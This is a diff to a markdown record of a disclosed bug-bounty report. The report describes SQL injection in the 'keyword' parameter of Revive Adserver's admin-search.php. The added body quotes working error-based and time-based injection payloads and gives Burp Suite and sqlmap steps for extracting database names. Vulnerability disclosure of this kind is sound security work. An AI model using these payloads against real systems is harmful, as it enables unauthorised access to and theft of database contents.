@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "SQL Injection"
 enriched: true
+body: true
 date: 2025-10-24
 submitted: 2025-10-22T21:18:20.218Z
 bounty_usd: null
@@ -26,6 +27,93 @@ title: "Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-s
 - Report: [https://hackerone.com/reports/3395221](https://hackerone.com/reports/3395221)
 - CWE: SQL Injection | CVE: CVE-2025-52664
 - Submitted: 2025-10-22T21:18:20.218Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+==Cricetinae==
+
+#Summary:
+
+A critical SQL Injection vulnerability has been identified in Revive Adserver's administrative search functionality, specifically in the `admin-search.php` file. The vulnerability exists in the handling of the keyword `GET` parameter, which is passed to multiple database queries without proper sanitization or parameterization.
+
+
+The vulnerability stems from the use of the phpAds_registerGlobalUnslashed() function to register user input variables, including keyword, without proper escaping:
+
+```php
+phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
+```
+
+Subsequently, this user-controlled input is passed directly to several database query functions:
+
+```php
+$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
+$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
+$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
+$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
+$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
+```
+
+Without examining the implementation of these functions, it's evident they do not properly sanitize the `keyword` parameter before incorporating it into SQL queries, resulting in SQL Injection.
+
+**Technical Analysis**
+
+Testing with SQLMap confirmed two distinct SQL Injection vulnerabilities:
+
+1.Error-based injection using MySQL's EXTRACTVALUE function:
+
+```bash
+Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
+```
+
+2. Time-based blind injection using MySQL's SLEEP function:
+
+```bash
+Payload: keyword=FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)-- YFDA&compact=t
+```
+
+#Steps To Reproduce:
+
+  1. open `burp suite` And open the built-in browser with it
+  1. Go to the following request: `http://localhost/www/admin/admin-search.php?keyword=FUZZ&compact=t`
+  1. Capture the request using Burp Suite
+  1. Save the request to a text file using `nano testsql.txt`
+  1. Run the following command:
+
+```bash
+sqlmap -r testsql.txt --dbs
+```
+
+  6. ==You will see the database being extracted==
+
+#Supporting Material/References:
+
+**PoC Video**
+
+{F4922045}
+
+https://portswigger.net/web-security/sql-injection
+https://owasp.org/www-community/attacks/SQL_Injection
+https://www.imperva.com/learn/application-security/sql-injection-sqli/
+https://www.cloudflare.com/learning/security/threats/sql-injection/
+https://www.acunetix.com/websitesecurity/sql-injection/
+
+## Impact
+
+This vulnerability allows an authenticated attacker to:
+
+- Extract sensitive information from the database
+- Modify or delete database contents
+- Potentially execute privileged commands on the database server
+- Possibly escalate to a more severe attack vector through data exfiltration
+
+The SQLMap test successfully identified the database name and confirmed the ability to execute arbitrary SQL queries through the vulnerable parameter.
+Root Cause
+
+The root cause is improper input validation and the absence of prepared statements or parameterized queries. The application directly incorporates user-controlled input into SQL queries without adequate sanitization or escaping mechanisms.
+
+This is a fundamental code flaw in the Revive Adserver source code and not a result of misconfiguration.
 
 ## Timeline
 
